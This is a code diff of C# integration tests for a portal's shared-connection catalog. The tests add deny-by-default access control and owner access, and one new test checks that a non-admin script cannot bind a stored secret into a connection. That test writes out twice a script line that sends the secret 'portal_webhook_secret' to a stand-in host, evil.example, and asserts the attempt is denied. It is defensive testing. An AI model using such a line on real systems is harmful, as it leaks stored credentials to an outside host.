@@ -70,10 +70,11 @@ public class PortalConnectionCatalogApiTests
         var verifyBody = await verify.Content.ReadFromJsonAsync<JsonObject>(Json);
         Assert.Equal(1, verifyBody!["secretReferences"]!.GetValue<int>());
 
-        // engine-facing provider resolves the definition and touches last-used
+        // engine-facing provider resolves the definition under an authorized identity and touches last-used
         var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
         Assert.Equal("PortalCatalog", provider.ProviderName);
-        var definition = await provider.ResolveAsync("sales_dw");
+        var adminIdentity = new ExecutionIdentity { EffectiveUser = "admin", RealUser = "admin", IsAdmin = true };
+        var definition = await provider.ResolveAsync("sales_dw", adminIdentity);
         Assert.Equal("MSSQL", definition.ConnectorType);
         Assert.Equal("sql01", definition.Options["SERVER"]);
         using (var scope = factory.Services.CreateScope())
@@ -91,20 +92,20 @@ public class PortalConnectionCatalogApiTests
 
         Assert.Equal(HttpStatusCode.NoContent,
             (await SendAsync(client, HttpMethod.Delete, token, "/api/admin/connections/sales_dw", null)).StatusCode);
-        await Assert.ThrowsAsync<KeyNotFoundException>(() => provider.ResolveAsync("sales_dw"));
+        await Assert.ThrowsAsync<KeyNotFoundException>(() => provider.ResolveAsync("sales_dw", adminIdentity));
 
         var import = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/import", exported);
         Assert.Equal(HttpStatusCode.OK, import.StatusCode);
-        var reimported = await provider.ResolveAsync("sales_dw");
+        var reimported = await provider.ResolveAsync("sales_dw", adminIdentity);
         Assert.Equal("SECRET:sales_db_password", reimported.Options["PASSWORD"]);
 
         // disable blocks resolution; enable restores it without re-supplying the definition
         Assert.Equal(HttpStatusCode.NoContent,
             (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/sales_dw/disable", null)).StatusCode);
-        await Assert.ThrowsAsync<InvalidOperationException>(() => provider.ResolveAsync("sales_dw"));
+        await Assert.ThrowsAsync<InvalidOperationException>(() => provider.ResolveAsync("sales_dw", adminIdentity));
         Assert.Equal(HttpStatusCode.NoContent,
             (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/sales_dw/enable", null)).StatusCode);
-        Assert.Equal("sql01", (await provider.ResolveAsync("sales_dw")).Options["SERVER"]);
+        Assert.Equal("sql01", (await provider.ResolveAsync("sales_dw", adminIdentity)).Options["SERVER"]);
         Assert.Equal(HttpStatusCode.NoContent,
             (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/sales_dw/disable", null)).StatusCode);
 
@@ -235,7 +236,7 @@ public class PortalConnectionCatalogApiTests
         using var client = factory.CreateClient();
         var token = await GetAdminTokenAsync(client);
 
-        // catalog an unrestricted entry
+        // catalog a new entry (deny-by-default before any grant)
         Assert.Equal(HttpStatusCode.NoContent,
             (await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/acl_dw", new
             {
@@ -244,9 +245,27 @@ public class PortalConnectionCatalogApiTests
             })).StatusCode);
 
         var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
+        var admin = new ExecutionIdentity { EffectiveUser = "root", RealUser = "root", IsAdmin = true };
+        var outsider = new ExecutionIdentity
+        {
+            EffectiveUser = "bob",
+            RealUser = "bob",
+            IsAdmin = false,
+            Groups = ["OtherTeam"]
+        };
+        var member = new ExecutionIdentity
+        {
+            EffectiveUser = "ann",
+            RealUser = "ann",
+            IsAdmin = false,
+            Groups = ["connusers"]
+        };
 
-        // no grants → usable without any identity (backward compatible)
-        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw")).Options["SERVER"]);
+        // no grants → denied to identity-less callers and non-admin/non-owner users; admin allowed
+        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw"));
+        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", outsider));
+        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", member));
+        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", admin)).Options["SERVER"]);
 
         // create a group and grant it use
         var group = await SendAsync(client, HttpMethod.Post, token, "/api/admin/groups", new { name = "ConnUsers" });
@@ -264,33 +283,42 @@ public class PortalConnectionCatalogApiTests
         await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw"));
 
         // non-member, non-admin identity → denied
-        var outsider = new ExecutionIdentity
-        {
-            EffectiveUser = "bob",
-            RealUser = "bob",
-            IsAdmin = false,
-            Groups = ["OtherTeam"]
-        };
         await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", outsider));
 
         // group member (name-based federated identity) → allowed
-        var member = new ExecutionIdentity
-        {
-            EffectiveUser = "ann",
-            RealUser = "ann",
-            IsAdmin = false,
-            Groups = ["connusers"]
-        };
         Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", member)).Options["SERVER"]);
 
         // admin → allowed
-        var admin = new ExecutionIdentity { EffectiveUser = "root", RealUser = "root", IsAdmin = true };
         Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", admin)).Options["SERVER"]);
 
-        // revoke → unrestricted again
+        // revoke last grant → stays closed to identity-less callers and non-admins, open only to admin/owner
         Assert.Equal(HttpStatusCode.NoContent,
             (await SendAsync(client, HttpMethod.Delete, token, $"/api/admin/connections/acl_dw/acl/{groupId}", null)).StatusCode);
-        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw")).Options["SERVER"]);
+        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw"));
+        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", member));
+        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", outsider));
+        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", admin)).Options["SERVER"]);
+
+        // owner without admin role can resolve ungranted entry, other non-admins cannot
+        using (var scopeOwner = factory.Services.CreateScope())
+        {
+            var db = scopeOwner.ServiceProvider.GetRequiredService<PortalDbContext>();
+            var conn = await db.PortalSharedConnections.SingleAsync(c => c.Alias == "acl_dw");
+            conn.OwnerUserId = 4242;
+            await db.SaveChangesAsync();
+
+            var catalogService = scopeOwner.ServiceProvider.GetRequiredService<PortalConnectionCatalogService>();
+            var ownerIdentity = new ExecutionIdentity
+            {
+                EffectiveUser = "owner4242",
+                EffectiveUserId = 4242,
+                RealUser = "owner4242",
+                IsAdmin = false
+            };
+            Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", ownerIdentity)).Options["SERVER"]);
+            Assert.Contains("acl_dw", await catalogService.ListUsableAliasesAsync(ownerIdentity));
+            Assert.DoesNotContain("acl_dw", await catalogService.ListUsableAliasesAsync(member));
+        }
 
         using var scope = factory.Services.CreateScope();
         var actions = await scope.ServiceProvider.GetRequiredService<PortalDbContext>()
@@ -418,7 +446,8 @@ public class PortalConnectionCatalogApiTests
         Assert.DoesNotContain("pg01.internal", body);
 
         var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
-        var definition = await provider.ResolveAsync("sensitive_dw");
+        var adminIdentity = new ExecutionIdentity { EffectiveUser = "admin", RealUser = "admin", IsAdmin = true };
+        var definition = await provider.ResolveAsync("sensitive_dw", adminIdentity);
         Assert.Contains("HOST", definition.SensitiveFields!);
 
         var export = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/export", null);
@@ -506,9 +535,15 @@ public class PortalConnectionCatalogApiTests
         await jobs.SaveJobAsync(new JobDefinition(
             "impact-job", "RUN SCRIPT referencing SHARED:impact_dw", 1, "days", null, null, null));
 
-        // a recorded consumer via resolution
+        // a recorded consumer via authorized resolution
+        var impactGroupRes = await SendAsync(client, HttpMethod.Post, token, "/api/admin/groups", new { name = "ImpactUsers" });
+        Assert.Equal(HttpStatusCode.Created, impactGroupRes.StatusCode);
+        var impactGroupId = (await impactGroupRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
+        Assert.Equal(HttpStatusCode.NoContent,
+            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/impact_dw/acl", new { groupId = impactGroupId })).StatusCode);
+
         var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
-        var ann = new ExecutionIdentity { EffectiveUser = "ann", RealUser = "ann", IsAdmin = false };
+        var ann = new ExecutionIdentity { EffectiveUser = "ann", RealUser = "ann", IsAdmin = false, Groups = ["ImpactUsers"] };
         _ = await provider.ResolveAsync("impact_dw", ann);
 
         var connImpact = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/impact_dw/impact", null);
@@ -638,6 +673,81 @@ public class PortalConnectionCatalogApiTests
         Assert.Contains("SHARED_CONNECTION_TEST", actions);
     }
 
+    [Fact]
+    public async Task DirectSecretInScript_DeniedForNonAdminInPortalExecution_WhileAuthorizedSharedAllowed()
+    {
+        using var factory = new CatalogFactory();
+        using var client = factory.CreateClient();
+        var token = await GetAdminTokenAsync(client);
+
+        Assert.Equal(HttpStatusCode.NoContent,
+            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/secrets/portal_webhook_secret",
+                new { value = "https://hooks.example/restricted-secret-path" })).StatusCode);
+
+        Assert.Equal(HttpStatusCode.NoContent,
+            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/restricted_webhook", new
+            {
+                connectorType = "WEBHOOK",
+                options = new Dictionary<string, string>
+                {
+                    ["URL"] = "SECRET:portal_webhook_secret",
+                    ["FORMAT"] = "generic"
+                },
+                sensitiveFields = new[] { "URL" }
+            })).StatusCode);
+
+        var (userId, _) = await CreateReadyUserAsync(client, token, "directsec", "Publisher");
+        var nonAdminIdentity = new ExecutionIdentity
+        {
+            EffectiveUser = $"user_{userId}",
+            EffectiveUserId = userId,
+            RealUser = $"user_{userId}",
+            IsAdmin = false
+        };
+
+        var executor = factory.Services.GetRequiredService<ETL_SQL.Core.IScriptExecutor>();
+        var directAttempt = await executor.ExecuteTextAsync(
+            "CREATE CONNECTION hijack AS WEBHOOK('https://evil.example/hook', BEARER_TOKEN = 'SECRET:portal_webhook_secret');",
+            Guid.NewGuid().ToString("N"),
+            CancellationToken.None,
+            executionIdentity: nonAdminIdentity);
+
+        Assert.False(directAttempt.Success);
+        Assert.DoesNotContain("restricted-secret-path", directAttempt.ErrorMessage ?? string.Empty, StringComparison.Ordinal);
+
+        // Ungranted SHARED: fails; once granted via group, SHARED: succeeds while direct SECRET: stays denied.
+        var sharedWithoutGrant = await executor.ExecuteTextAsync(
+            "CREATE CONNECTION allowed_conn AS WEBHOOK('SHARED:restricted_webhook');",
+            Guid.NewGuid().ToString("N"),
+            CancellationToken.None,
+            executionIdentity: nonAdminIdentity);
+        Assert.False(sharedWithoutGrant.Success);
+
+        var grpRes = await SendAsync(client, HttpMethod.Post, token, "/api/admin/groups", new { name = "SecretBypassCheckGroup" });
+        Assert.Equal(HttpStatusCode.Created, grpRes.StatusCode);
+        var grpId = (await grpRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
+        var grpEtag = grpRes.Headers.ETag?.ToString() ?? "\"1\"";
+        Assert.Equal(HttpStatusCode.OK,
+            (await SendAsync(client, HttpMethod.Post, token, $"/api/admin/groups/{grpId}/members", new { userId }, grpEtag)).StatusCode);
+        Assert.Equal(HttpStatusCode.NoContent,
+            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/restricted_webhook/acl", new { groupId = grpId })).StatusCode);
+
+        var grantedIdentity = nonAdminIdentity with { Groups = ["SecretBypassCheckGroup"] };
+        var sharedWithGrant = await executor.ExecuteTextAsync(
+            "CREATE CONNECTION allowed_conn AS WEBHOOK('SHARED:restricted_webhook');",
+            Guid.NewGuid().ToString("N"),
+            CancellationToken.None,
+            executionIdentity: grantedIdentity);
+        Assert.True(sharedWithGrant.Success, sharedWithGrant.ErrorMessage);
+
+        var directAfterGrant = await executor.ExecuteTextAsync(
+            "CREATE CONNECTION hijack2 AS WEBHOOK('https://evil.example/hook2', BEARER_TOKEN = 'SECRET:portal_webhook_secret');",
+            Guid.NewGuid().ToString("N"),
+            CancellationToken.None,
+            executionIdentity: grantedIdentity);
+        Assert.False(directAfterGrant.Success);
+    }
+
     private sealed class CatalogFactory : PortalWebFactory
     {
         protected override void CustomizeConfiguration(Dictionary<string, string?> settings)
@@ -696,10 +806,12 @@ public class PortalConnectionCatalogApiTests
     }
 
     private static async Task<HttpResponseMessage> SendAsync(HttpClient client, HttpMethod method,
-        string token, string url, object? body)
+        string token, string url, object? body, string? ifMatch = null)
     {
         var request = new HttpRequestMessage(method, url);
         request.Headers.Authorization = new("Bearer", token);
+        if (!string.IsNullOrWhiteSpace(ifMatch))
+            request.Headers.TryAddWithoutValidation("If-Match", ifMatch);
         if (body is not null) request.Content = JsonContent.Create(body);
         return await client.SendAsync(request);
     }
